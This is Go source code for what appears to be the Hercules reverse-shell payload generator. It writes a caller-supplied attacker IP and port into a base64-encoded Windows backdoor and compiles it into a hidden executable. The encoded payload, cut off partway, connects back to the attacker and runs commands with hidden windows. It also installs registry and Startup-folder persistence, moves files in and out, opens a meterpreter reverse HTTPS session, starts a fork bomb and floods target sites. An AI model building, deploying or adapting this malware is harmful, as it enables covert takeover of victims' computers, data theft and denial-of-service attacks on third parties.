package main



import "strings"
import "fmt"
import "os"
import "runtime"
import "os/exec"
import "path/filepath"
import "encoding/base64"
import "github.com/fatih/color"



func main() { // 192.168.1.1 8888 -p windows -a x86 -l static 
  dir, _ := filepath.Abs(filepath.Dir(os.Args[0]));
  ARGS := os.Args[1:]

  var ARG string
  var PAYLOAD string = "Windows"
  var ARC string = "386" 
  var LINKER string = "static"

  if len(ARGS) == 0 {
    color.Yellow(HELP)
    os.Exit(1)
  }

  if len(ARGS[0]) < 7 || len(ARGS[0]) > 15 {
    color.Red("\n[-] ERROR : Invalid IP !")
    os.Exit(1)
  }

  if len(ARGS[1]) < 1 || len(ARGS[1]) > 5 {
    color.Red("\n[-] ERROR : Invalid Port !")
    os.Exit(1)
  }

  for i := 0; i < len(ARGS); i++ {
    if i == 0 {
      ARG = ARGS[i]
    }else{
      ARG = (ARG +" "+ ARGS[i])
    }
  }

  if strings.Contains(ARG, "-a x86") || strings.Contains(ARG, "-A X86") || strings.Contains(ARG, "-A x86") || strings.Contains(ARG, "-a X86") {
    ARC = "386"
  }else if strings.Contains(ARG, "-a x64") || strings.Contains(ARG, "-A X64") || strings.Contains(ARG, "-a X64") || strings.Contains(ARG, "-A x64") {
    ARC = "amd64"
  }else if strings.Contains(ARG, "-a") || strings.Contains(ARG, "-A") {
    color.Red("\n[-] ERROR : Invalid Architecture !")
    os.Exit(1)
  }

 if  strings.Contains(ARG, "-l static") || strings.Contains(ARG, "-L STATIC") || strings.Contains(ARG, "-l STATIC") || strings.Contains(ARG, "-L static") {
  LINKER =  "static"
 }else if strings.Contains(ARG, "-l dynamic") || strings.Contains(ARG, "-L DYNAMIC") || strings.Contains(ARG, "-l DYNAMIC") || strings.Contains(ARG, "-L dynamic") {
  LINKER = "dynamic"
 }else if strings.Contains(ARG, "-l") {
  color.Red("\n[-] ERROR : Invalid Linker !")
  os.Exit(1)
 }




  if strings.Contains(ARG, "-p windows") || strings.Contains(ARG, "-P WINDOWS") || strings.Contains(ARG, "-p Windows") || strings.Contains(ARG, "-P windows") || strings.Contains(ARG, "-p WINDOWS") || strings.Contains(ARG, "-P Windows") {
    WINDOWS_PAYLOAD, _ := base64.StdEncoding.DecodeString(WINDOWS_PAYLOAD)
    GENERATE_PAYLOAD(ARGS[0], ARGS[1], string(WINDOWS_PAYLOAD), ARC, LINKER)
    PAYLOAD = "Windows"
  }else if strings.Contains(ARG, "-p linux") || strings.Contains(ARG, "-P LINUX") || strings.Contains(ARG, "-p Linux") || strings.Contains(ARG, "-P linux") || strings.Contains(ARG, "-p LINUX") || strings.Contains(ARG, "-P Linux") {
    LINUX_PAYLOAD, _ := base64.StdEncoding.DecodeString(LINUX_PAYLOAD)
    GENERATE_PAYLOAD(ARGS[0], ARGS[1], string(LINUX_PAYLOAD), ARC, LINKER)
    PAYLOAD = "Linux"
  }else if strings.Contains(ARG, "-p osx") || strings.Contains(ARG, "-P OSX") || strings.Contains(ARG, "-p OSX") || strings.Contains(ARG, "-P osx") {
    OSX_PAYLOAD, _ := base64.StdEncoding.DecodeString(OSX_PAYLOAD)
    GENERATE_PAYLOAD(ARGS[0], ARGS[1], string(OSX_PAYLOAD), ARC, LINKER)
    PAYLOAD = "OSX"
  }else if strings.Contains(ARG, "-p") || strings.Contains(ARG, "-P") {
    color.Red("\n[-] ERROR : Invalid Payload !")
    os.Exit(1)
  }


  color.Blue("\n\n[*] Payload : "+PAYLOAD)
  color.Blue("\n[*] Architecture : "+ARC)
  color.Blue("\n[*] Linker : "+LINKER)
  color.Green(string("\n\n[+] Payload generated as Payload.exe at "+dir)) 
}


func GENERATE_PAYLOAD(IP string, PORT string, PAYLOAD string, ARC string, LINKER string) {

  IP = string("\""+IP+"\";")
  PORT = string("\""+PORT+"\";")
  Payload_Source, err := os.Create("Payload.go")
  if err != nil {
    fmt.Println(err)
  }
  runtime.GC()
  Index := strings.Replace(PAYLOAD, "\"127.0.0.1\";", IP, -1)
  Index = strings.Replace(Index, "\"8552\";", PORT, -1)
  Payload_Source.WriteString(Index)
  runtime.GC()

  if runtime.GOOS == "windows" {

    if LINKER == "static" {
      LINKER = string("set GOARC="+ARC+"\ngo build -ldflags \"-H windowsgui\" Payload.go ")
    }else if LINKER == "dynamic" || LINKER == "DYNAMIC" {
      LINKER = string("set GOARC="+ARC+"\ngo build -ldflags \"-H windowsgui -s\" Payload.go ")
    }


    Builder, err := os.Create("Build.bat")
    if err != nil {
      fmt.Println(err)
    } 
    Builder.WriteString(LINKER)
    runtime.GC()
    exec.Command("cmd", "/C", "Build.bat").Run()
    runtime.GC()
    exec.Command("cmd", "/C", " del Build.bat").Run()
    runtime.GC()
    exec.Command("cmd", "/C", "del Payload.go").Run()
    runtime.GC()
  }else if runtime.GOOS == "linux" {

    if LINKER == "static" {
      LINKER = string("export GOOS=windows && export GOARC="+ARC+" && go build -ldflags \"-H windowsgui\" Payload.go && export GOOS=linux && export GOARC=amd64")
    }else if LINKER == "dynamic" || LINKER == "DYNAMIC" {
      LINKER = string("export GOOS=windows && export GOARC="+ARC+" && go build -ldflags \"-H windowsgui -s\" Payload.go && export GOOS=linux && export GOARC=amd64")
    }

    exec.Command("sh", "-c", LINKER).Run()
    runtime.GC()
    exec.Command("sh", "-c", "rm Payload.go").Run()
  }
}





var WINDOWS_PAYLOAD string = `DQpwYWNrYWdlIG1haW47DQoNCmltcG9ydCAibmV0IjsNCmltcG9ydCAib3MvZXhlYyI7DQppbXBvcnQgImJ1ZmlvIjsNCmltcG9ydCAib3MiOw0KaW1wb3J0ICJzdHJpbmdzIjsNCmltcG9ydCAicGF0aC9maWxlcGF0aCI7DQppbXBvcnQgInJ1bnRpbWUiOw0KaW1wb3J0ICJzeXNjYWxsIjsNCmltcG9ydCAibmV0L2h0dHAiOw0KaW1wb3J0ICJ0aW1lIjsNCmltcG9ydCAiaW8iOw0KaW1wb3J0ICJieXRlcyINCmltcG9ydCAiY29tcHJlc3MvZmxhdGUiDQppbXBvcnQgImVuY29kaW5nL2Jhc2U2NCINCg0KDQoNCmNvbnN0IElQIHN0cmluZyA9ICIxMjcuMC4wLjEiOw0KY29uc3QgUE9SVCBzdHJpbmcgPSAiODU1MiI7DQpjb25zdCBUSU1FX0RFTEFZIHRpbWUuRHVyYXRpb24gPSA1Oy8vU2Vjb25kDQoNCnZhciBHTE9CQUxfQ09NTUFORCBzdHJpbmc7DQp2YXIgUGVyc2lzdGVuY2VfT3V0cHV0IHN0cmluZzsNCnZhciBET1NfVGFyZ2V0IHN0cmluZzsNCnZhciBET1NfUmVxdWVzdF9Db3VudGVyIGludCA9IDA7DQp2YXIgRE9TX1JlcXVlc3RfTGltaXQgaW50ID0gMTAwMDsNCg0KdmFyIElQX1BPUlQgc3RyaW5nOw0KDQpmdW5jIG1haW4oKSB7DQogICAgICAgICAgICAgICAgICAgICAgICAgIA0KICBjb25uZWN0LCBlcnIgOj0gbmV0LkRpYWwoInRjcCIsIElQKyI6IitQT1JUKTsgICAgICAgICAgICAgICAgICAgICAgIA0KICBpZiBlcnIgIT0gbmlsIHsgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIA0KICAgIHRpbWUuU2xlZXAoVElNRV9ERUxBWSp0aW1lLlNlY29uZCk7ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICANCiAgICBtYWluKCk7ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgDQogIH07ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICANCiANCiAgZGlyLCBfIDo9IGZpbGVwYXRoLkFicyhmaWxlcGF0aC5EaXIob3MuQXJnc1swXSkpOyAgICAgDQogIFZlcnNpb25fQ2hlY2sgOj0gZXhlYy5Db21tYW5kKCJjbWQiLCAiL0MiLCAidmVyIik7DQogIFZlcnNpb25fQ2hlY2suU3lzUHJvY0F0dHIgPSAmc3lzY2FsbC5TeXNQcm9jQXR0cntIaWRlV2luZG93OiB0cnVlfTsNCiAgdmVyc2lvbiwgXyA6PSBWZXJzaW9uX0NoZWNrLk91dHB1dCgpOyAgICAgICAgICAgDQogIFN5c0d1aWRlIDo9IChCQU5ORVIrIlxuIitzdHJpbmcodmVyc2lvbikgKyAiXG5cbiIgKyBzdHJpbmcoZGlyKSArICI+Iik7ICAgICAgDQogIGNvbm5lY3QuV3JpdGUoW11ieXRlKHN0cmluZyhTeXNHdWlkZSkpKTsgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIA0KIA0KICANCiAgZm9yIHsNCiAgICANCiAgICBDb21tYW5kLCBfIDo9IGJ1ZmlvLk5ld1JlYWRlcihjb25uZWN0KS5SZWFkU3RyaW5nKCdcbicpOyAgICAgICAgICAgICAgICAgICAgICAgDQogICAgX0NvbW1hbmQgOj0gc3RyaW5nKENvbW1hbmQpOyAgICAgICAgICAgICAgICAgICAgICANCiAgICBHTE9CQUxfQ09NTUFORCA9IF9Db21tYW5kOyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgDQogICAgDQoNCiAgICANCiAgICBpZiBzdHJpbmdzLkNvbnRhaW5zKF9Db21tYW5kLCAifnBsZWFzZSIpIHx8IHN0cmluZ3MuQ29udGFpbnMoX0NvbW1hbmQsICJ+UExFQVNFIikgeyANCiAgICAgIGNvbm5lY3QuV3JpdGUoW11ieXRlKFNBWV9QTEVBU0UoKSkpOw0KICAgIH1lbHNlIGlmIHN0cmluZ3MuQ29udGFpbnMoX0NvbW1hbmQsICJ+ZG93bmxvYWQgLWYiKSB8fCBzdHJpbmdzLkNvbnRhaW5zKF9Db21tYW5kLCAifkRPV05MT0FEIC1GICIpIHsNCiAgICAgIGdvIERPV05MT0FEKCk7DQogICAgICBjb25uZWN0LldyaXRlKFtdYnl0ZSgiXG5bKl0gU2VuZGluZyBmaWxlIHRvIC0+ICIrSVArIjo1NTg4OFxuXG4iKSk7ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIA0KICAgIH1lbHNlIGlmIHN0cmluZ3MuQ29udGFpbnMoX0NvbW1hbmQsICJ+dXBsb2FkIC1mIikgfHwgc3RyaW5ncy5Db250YWlucyhfQ29tbWFuZCwgIn5VUExPQUQgLUYgIikgew0KICAgICAgZ28gVVBMT0FEKCk7DQogICAgICBjb25uZWN0LldyaXRlKFtdYnl0ZSgiXG5bKl0gUmVjZWl2aW5nIGZpbGUgZnJvbSAtPiAiK0lQKyI6NTU4ODhcblxuIikpOyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIA0KICAgIH1lbHNlIGlmIHN0cmluZ3MuQ29udGFpbnMoX0NvbW1hbmQsICJ+TUVURVJQUkVURVIgLUEiKSB8fCBzdHJpbmdzLkNvbnRhaW5zKF9Db21tYW5kLCAifm1ldGVycHJldGVyIC1hIikgew0KICAgICAgVGVtcF9JUF9QT1JUIDo9IHN0cmluZ3MuU3BsaXQoX0NvbW1hbmQsICJcIiIpDQogICAgICBJUF9QT1JUID0gc3RyaW5nKFRlbXBfSVBfUE9SVFsxXSkNCiAgICAgIE1FVEVSUFJFVEVSX0NSRUFURSgpOw0KICAgICAgY29ubmVjdC5Xcml0ZShbXWJ5dGUoIlxuXG5bK10gTWV0ZXJwcmV0ZXIgRXhlY3V0ZWQgIVxuXG4iK2RpcisiPiIpKTsgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIA0KICAgIH1lbHNlIGlmIHN0cmluZ3MuQ29udGFpbnMoX0NvbW1hbmQsICJ+RE9TIikgfHwgc3RyaW5ncy5Db250YWlucyhfQ29tbWFuZCwgIn5kb3MiKSB7DQogICAgICBET1NfQ29tbWFuZCA6PSBzdHJpbmdzLlNwbGl0KEdMT0JBTF9DT01NQU5ELCAiXCIiKQ0KICAgICAgRE9TX1RhcmdldCA9ICBET1NfQ29tbWFuZFsxXQ0KICAgICAgaWYgc3RyaW5ncy5Db250YWlucyhzdHJpbmcoRE9TX1RhcmdldCksICJodHRwIikgew0KICAgICAgICBnbyBET1MoKTsNCiAgICAgICAgY29ubmVjdC5Xcml0ZShbXWJ5dGUoIlxuXG5bKl0gU3RhcnRpbmcgRE9TIGF0YWNrLi4uIisiXG5cblsqXSBTZW5kaW5nIDEwMDAgcmVxdWVzdCB0byAiK0RPU19UYXJnZXQrIiAhXG5cbiIrZGlyKyI+IikpOw0KICAgICAgfWVsc2V7DQogICAgICAgIGNvbm5lY3QuV3JpdGUoW11ieXRlKCJcblxuWy1dIEVSUk9SOiBJbnZhbGlkIHVybCAhXG5cbiIrZGlyKyI+IikpOw0KICAgICAgfSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICANCiAgICB9ZWxzZSBpZiBzdHJpbmdzLkNvbnRhaW5zKF9Db21tYW5kLCAifkRJU1RSQUNUIikgfHwgc3RyaW5ncy5Db250YWlucyhfQ29tbWFuZCwgIn5kaXN0cmFjdCIpIHsgDQogICAgICBESVNUUkFDVCgpOyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgDQogICAgfWVsc2UgaWYgc3RyaW5ncy5Db250YWlucyhfQ29tbWFuZCwgIn5IRUxQIikgfHwgc3RyaW5ncy5Db250YWlucyhfQ29tbWFuZCwgIn5oZWxwIikgeyANCiAgICAgIGNvbm5lY3QuV3JpdGUoW11ieXRlKHN0cmluZyhIRUxQK2RpcisiPiIpKSk7ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgDQogICAgfWVsc2UgaWYgc3RyaW5ncy5Db250YWlucyhfQ29tbWFuZCwgIn5QRVJTSVNURU5DRSIpIHx8IHN0cmluZ3MuQ29udGFpbnMoX0NvbW1hbmQsICJ+cGVyc2lzdGVuY2UiKSB7ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIA0KICAgICAgUEVSU0lTVCgpOw0KICAgICAgY29ubmVjdC5Xcml0ZShbXWJ5dGUoc3RyaW5nKFBlcnNpc3RlbmNlX091dHB1dCkpKTsgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICANCiAgICB9ZWxzZXsNCiAgICAgIGNtZCA6PSBleGVjLkNvbW1hbmQoImNtZCIsICIvQyIsIF9Db21tYW5kKTsNCiAgICAgIGNtZC5TeXNQcm9jQXR0ciA9ICZzeXNjYWxsLlN5c1Byb2NBdHRye0hpZGVXaW5kb3c6IHRydWV9Ow0KICAgICAgb3V0LCBfIDo9IGNtZC5PdXRwdXQoKTsNCiAgICAgIENvbW1hbmRfT3V0cHV0IDo9IHN0cmluZygiXG5cbiIrc3RyaW5nKG91dCkrIlxuIitzdHJpbmcoZGlyKSsiPiIpOw0KICAgICAgY29ubmVjdC5Xcml0ZShbXWJ5dGUoQ29tbWFuZF9PdXRwdXQpKTsNCiAgICB9Ow0KICB9Ow0KfTsNCg0KDQoNCg0KDQpmdW5jIFBFUlNJU1QoKSB7DQoNCiAgcmVna2V5IDo9ICJSRUcgQUREIFwiSEtDVVxcU09GVFdBUkVcXE1pY3Jvc29mdFxcV2luZG93c1xcQ3VycmVudFZlcnNpb25cXFJ1blwiIC9WIFwiQVJDQU5VU1wiIC90IFJFR19TWiAvRiAvRCBcIiIrIiUiKyJhcHBkYXRhIisiJSIrIlxcd2luZGxsLmV4ZSI7DQogIHJ1bnRpbWUuR0MoKTsNCiAgY21kIDo9IGV4ZWMuQ29tbWFuZCgiY21kIiwgIi9DIiwgc3RyaW5nKHJlZ2tleSkpOw0KICBjbWQuU3lzUHJvY0F0dHIgPSAmc3lzY2FsbC5TeXNQcm9jQXR0cntIaWRlV2luZG93OiB0cnVlfTsNCiAgUGVyc2lzdGVuY2VfT3V0cHV0XzEsIGVycm9yXzEgOj0gY21kLk91dHB1dCgpOw0KICBydW50aW1lLkdDKCk7DQogIGN1c3RvbV9jb21tYW5kIDo9ICgieGNvcHkgXCIiKyIlIisiYXBwZGF0YSIrIiUiKyJcXHdpbmRsbC5leGVcIiBcIiIrIiUiKyJhcHBkYXRhIisiJSIrIlxcTWljcm9zb2Z0XFxXaW5kb3dzXFxTdGFydCBNZW51XFxQcm9ncmFtc1xcU3RhcnR1cFwiIik7DQogIGNtZCA9IGV4ZWMuQ29tbWFuZCgiY21kIiwgIi9DIiwgc3RyaW5nKGN1c3RvbV9jb21tYW5kKSk7DQogIGNtZC5TeXNQcm9jQXR0ciA9ICZzeXNjYWxsLlN5c1Byb2NBdHRye0hpZGVXaW5kb3c6IHRydWV9Ow0KICBQZXJzaXN0ZW5jZV9PdXRwdXRfMiwgZXJyb3JfMiA6PSBjbWQuT3V0cHV0KCk7DQogIGlmIGVycm9yXzIgIT0gbmlsICYmIGVycm9yXzEgIT0gbmlsIHsNCiAgICBQZXJzaXN0ZW5jZV9PdXRwdXQgPSAoIlsqXSBQZXJzaXN0ZW5jZSBmYWlsZWQgISIpOw0KICB9ZWxzZXsNCiAgICBQZXJzaXN0ZW5jZV9PdXRwdXQgPSBzdHJpbmcoIlsqXSAiICsgc3RyaW5nKFBlcnNpc3RlbmNlX091dHB1dF8xKSArICJcblsqXSAiICsgc3RyaW5nKFBlcnNpc3RlbmNlX091dHB1dF8yKSk7DQogIH07DQogIC8qDQogIFJ1biA9IGV4ZWMuQ29tbWFuZCgiY21kIiwgIi9DIiwgIiIpOw0KICBSdW4uU3lzUHJvY0F0dHIgPSAmc3lzY2FsbC5TeXNQcm9jQXR0cntIaWRlV2luZG93OiB0cnVlfTsNCiAgUnVuLlN0YXJ0KCk7DQogICovDQp9Ow0KDQoNCg0KZnVuYyBVUExPQUQoKSB7DQogIGNvbm5lY3QsIGVyciA6PSBuZXQuRGlhbCgidGNwIiwgSVArIjoiKyI1NTg4OCIpOw0KICBpZiBlcnIgIT0gbmlsIHsNCiAgICBVUExPQUQoKTsNCiAgfTsNCiAgZmlsZV9uYW1lIDo9IHN0cmluZ3MuU3BsaXQoR0xPQkFMX0NPTU1BTkQsICJcIiIpOw0KICBmaWxlLCBfIDo9IG9zLkNyZWF0ZShmaWxlX25hbWVbMV0pOw0KICBmaWxlX25hbWVbMV0gPSBzdHJpbmdzLlRyaW0oZmlsZV9uYW1lWzFdLCAiICIpOw0KICBkZWZlciBmaWxlLkNsb3NlKCk7DQogIGlvLkNvcHkoZmlsZSwgY29ubmVjdCk7DQogIGZpbGUuQ2xvc2UoKTsNCiAgY29ubmVjdC5DbG9zZSgpOw0KfTsNCg0KDQpmdW5jIERPV05MT0FEKCkgew0KICBjb25uZWN0LCBlcnIgOj0gbmV0LkRpYWwoInRjcCIsIElQKyI6IisiNTU4ODgiKTsNCiAgaWYgZXJyICE9IG5pbCB7DQogICAgRE9XTkxPQUQoKTsNCiAgfTsNCiAgZmlsZV9uYW1lIDo9IHN0cmluZ3MuU3BsaXQoR0xPQkFMX0NPTU1BTkQsICJcIiIpOw0KICBmaWxlLCBfIDo9IG9zLkNyZWF0ZShmaWxlX25hbWVbMV0pOw0KICBmaWxlX25hbWVbMV0gPSBzdHJpbmdzLlRyaW0oZmlsZV9uYW1lWzFdLCAiICIpOw0KICBkZWZlciBmaWxlLkNsb3NlKCk7DQogIGlvLkNvcHkoZmlsZSwgY29ubmVjdCk7DQogIGZpbGUuQ2xvc2UoKTsNCiAgY29ubmVjdC5DbG9zZSgpOw0KfTsNCg0KDQoNCg0KZnVuYyBTQVlfUExFQVNFKCkgKHN0cmluZyl7DQogIENvbW1hbmQgOj0gc3RyaW5ncy5TcGxpdChHTE9CQUxfQ09NTUFORCwgIlwiIik7DQogIGNtZCA6PSBleGVjLkNvbW1hbmQoImNtZCIsICIvQyIsIHN0cmluZygicG93ZXJzaGVsbC5leGUgLUNvbW1hbmQgU3RhcnQtUHJvY2VzcyAtVmVyYiBSdW5BcyAiK3N0cmluZyhDb21tYW5kWzFdKSkpOw0KICBjbWQuU3lzUHJvY0F0dHIgPSAmc3lzY2FsbC5TeXNQcm9jQXR0cntIaWRlV2luZG93OiB0cnVlfTsNCiAgb3V0LCBfIDo9IGNtZC5PdXRwdXQoKTsNCiAgQ29tbWFuZF9PdXRwdXQgOj0gc3RyaW5nKHN0cmluZyhvdXQpKTsNCiAgcmV0dXJuIENvbW1hbmRfT3V0cHV0Ow0KfTsNCg0KDQoNCg0KZnVuYyBESVNUUkFDVCgpIHsNCiAgdmFyIEZvcmtfQm9tYiBzdHJpbmcgPSAiOkFcbnN0YXJ0XG5nb3RvIEEiDQogIEZfQm9tYiwgXyA6PSBvcy5DcmVhdGUoIkZfQm9tYi5iYXQiKQ0KDQogIEZfQm9tYi5Xcml0ZVN0cmluZyhGb3JrX0JvbWIpDQoNCiAgRl9Cb21iLkNsb3NlKCkNCg0KICBleGVjLkNvbW1hbmQoImNtZCIsICIvQyIsICJGX0JvbWIuYmF0IikuU3RhcnQoKQ0KDQp9DQoNCg0KZnVuYyBET1MoKSB7DQogIGZvciB7DQogICAgRE9TX1JlcXVlc3RfQ291bnRlcisrDQogICAgcmVzcG9uc2UsIGVyciA6PSBodHRwLkdldChET1NfVGFyZ2V0KTsNCiAgICBpZiBlcnIgIT0gbmlsIHsNCiAgICAgIGJyZWFrOw0KICAgIH0NCiAgICByZXNwb25zZS5Cb2R5LkNsb3NlKCk7DQogICAgaWYgRE9TX1JlcXVlc3RfQ291bnRlciA8IERPU19SZXF1ZXN0X0xpbWl0IHsNCiAgICAgIGdvIERPUygpDQogICAgfWVsc2V7DQogICAgICBicmVhazsNCiAgICB9IA0KICB9DQp9DQoNCg0KDQpmdW5jIE1FVEVSUFJFVEVSX0NSRUFURSgpIHsNCg0KICB2YXIgQnVmZmVyIGJ5dGVzLkJ1ZmZlcg0KICB2YXIgUG93ZXJzaGVsbF9SZXZlcnNlX0h0dHBzIHN0cmluZyA9IFJFVkVSU0VfSFRUUFNfU0hFTEwoc3RyaW5nKElQX1BPUlQpKQ0KDQogIEZsYXRlLCBfIDo9IGZsYXRlLk5ld1dyaXRlcigmQnVmZmVyLDYpDQogIGlmIF8sIGVyciA6PSBGbGF0ZS5Xcml0ZShbXWJ5dGUoUG93ZXJzaGVsbF9SZXZlcnNlX0h0dHBzKSk7IGVyciAhPSBuaWwgew0KICAgIHBhbmljKGVycikNCiAgfQ0KICBpZiBlcnIgOj0gRmxhdGUuRmx1c2goKTsgZXJyICE9IG5pbCB7DQogICAgcGFuaWMoZXJyKQ0KICB9DQogIGlmIGVyciA6PSBGbGF0ZS5DbG9zZSgpOyBlcnIgIT0gbmlsIHsNCiAgICBwYW5pYyhlcnIpDQogIH0NCg0KICBCdWZmZXJTdHJpbmcgOj0gQnVmZmVyLkJ5dGVzKCkNCiAgRW5jb2RlZENvbXByZXNzZWRCdWZmZXIgOj0gYmFzZTY0LlN0ZEVuY29kaW5nLkVuY29kZVRvU3RyaW5nKFtdYnl0ZShCdWZmZXJTdHJpbmcpKQ0KDQoNCiAgdmFyIFBTX01ldGVycHJldGVyIHN0cmluZyA9IENSRUFURV9QU19NRVRFUlBSRVRFUihFbmNvZGVkQ29tcHJlc3NlZEJ1ZmZlcikNCg0KICBGaWxlLCBfIDo9IG9zLkNyZWF0ZSgiV2luZGxsLmJhdCIpDQogIEZpbGUuV3JpdGVTdHJpbmcoUFNfTWV0ZXJwcmV0ZXIpDQoNCiAgRmlsZS5DbG9zZSgpOw0KDQogIFRlbXBDb21tYW5kIDo9IHN0cmluZygibW92ZSB3aW5kbGwuYmF0ICUiKyJBUFBEQVRBIisiJSIpDQoNCiAgTW92ZSA6PSBleGVjLkNvbW1hbmQoImNtZCIsICIvQyIsIFRlbXBDb21tYW5kKTsNCiAgTW92ZS5TeXNQcm9jQXR0ciA9ICZzeXNjYWxsLlN5c1Byb2NBdHRye0hpZGVXaW5kb3c6IHRydWV9Ow0KICBNb3ZlLlJ1bigpOw0KDQogIFRlbXBDb21tYW5kXzIgOj0gc3RyaW5nKCIlIisiQVBQREFUQSIrIiUiKyJcXHdpbmRsbC5iYXQiKQ0KDQogIEV4ZWMgOj0gZXhlYy5Db21tYW5kKCJjbWQiLCAiL0MiLCBUZW1wQ29tbWFuZF8yKTsNCiAgRXhlYy5TeXNQcm9jQXR0ciA9ICZzeXNjYWxsLlN5c1Byb2NBdHRye0hpZGVXaW5kb3c6IHRydWV9Ow0KICBFeGVjLlN0YXJ0KCk7DQoNCn0NCg0KDQp2YXIgQkFOTkVSIHN0cmluZyA9IGANCiAgICAgICAgICAgICAgICAgIF9fICBfX19fX19fX19fX18gIF9fX19fX19fICBfX19fICAgIF9fX19fX19fX19fDQogICAgICAgICAgICAgICAgIC8gLyAvIC8gX19fXy8gX18gXC8gX19fXy8gLyAvIC8gLyAgIC8gX19fXy8gX19fLw0KICAgICAgICAgICAgICAgIC8gL18vIC8gX18vIC8gL18vIC8gLyAgIC8gLyAvIC8gLyAgIC8gX18vICBcX18gXCANCiAgICAgICAgICAgICAgIC8gX18gIC8gL19fXy8gXywgXy8gL19fXy8gL18vIC8gL19fXy8gL19fXyBfX18vIC8gDQogICAgICAgICAgICAgIC9fLyAvXy9fX19fXy9fLyB8X3xcX19fXy9cX19fXy9fX19fXy9fX19fXy8vX19fXy8gIA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgDQoNCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMgSEVSQ1VMRVMgUkVWRVJTRSBTSEVMTCAjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjDQoNCmANCg0KDQoNCg0KdmFyIEhFTFAgc3RyaW5nID0gYA0KDQogICAgICAgICAgICAgICAgICBfXyAgX19fX19fX19fX19fICBfX19fX19fXyAgX19fXyAgICBfX19fX19fX19fXw0KICAgICAgICAgICAgICAgICAvIC8gLyAvIF9fX18vIF9fIFwvIF9fX18vIC8gLyAvIC8gICAvIF9fX18vIF9fXy8NCiAgICAgICAgICAgICAgICAvIC9fLyAvIF9fLyAvIC9fLyAvIC8gICAvIC8gLyAvIC8gICAvIF9fLyAgXF9fIFwgDQogICAgICAgICAgICAgICAvIF9fICAvIC9fX18vIF8sIF8vIC9fX18vIC9fLyAvIC9fX18vIC9fX18gX19fLyAvIA0KICAgICAgICAgICAgICAvXy8gL18vX19fX18vXy8gfF98XF9fX18vXF9fX18vX19fX18vX19fX18vL19fX18vICANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIA0KDQojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIEhFUkNVTEVTIFJFVkVSU0UgU0hFTEwgIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIw0KDQoNCg0KflBFUlNTSVNURU5DRSAgICAgICAgICAgICAgICAgICAgIEluc3RhbGxzIGEgcGVyc2lzdGVuY2UgbW9kdWxlDQoNCn5ESVNUUkFDVCAgICAgICAgICAgICAgICAgICAgICAgICBFeGVjdXRlcyBhIGZvcmsgYm9tYiBiYXQgZmlsZSBmb3IgZGlzdHJhY3Rpb24gICANCg0KflBMRUFTRSAgICAgICAgICAgICAgICAgICAgICAgICAgIEFza3MgdXNlcnMgY29tZmlybWF0aW9uIGZvciBoaWdoZXIgcHJpdmlsaWRnZSBvcGVyYXRpb25zDQoNCn5ET1MgLUEgInd3dy50YXJnZXRzaXRlLmNvbSIgICAgICBTdGFydHMgYSBkZW5pYWwgb2Ygc2VydmljZSBhdGFjaw0KDQp+TUVURVJQUkVURVIgLUEgIjEyNy4wLjAuMTo4ODg4IiAgQ3JlYXRlcyBhIHJldmVyc2UgaHR0cHMgbWV0ZXJwcmV0ZXIgY29ubmVjdGlvbiB0byBtZXRhc3Bsb2l0DQoNCn5ET1dOTE9BRCAtRiAiZmlsZW5hbWUuZXhlIiAgICAgICBTZW5kcyB0aGUgc2VsZWN0ZWQgZmlsZSB0byB5b3VyIGlwIHRocnUgNTU4ODggcG9ydA0KDQp+VVBMT0FEIC1GICJmaWxlbmFtZS5leGUiICAgICAgICAgUmVtb3RlIG1hY2hpbmUgc3RhcnRzI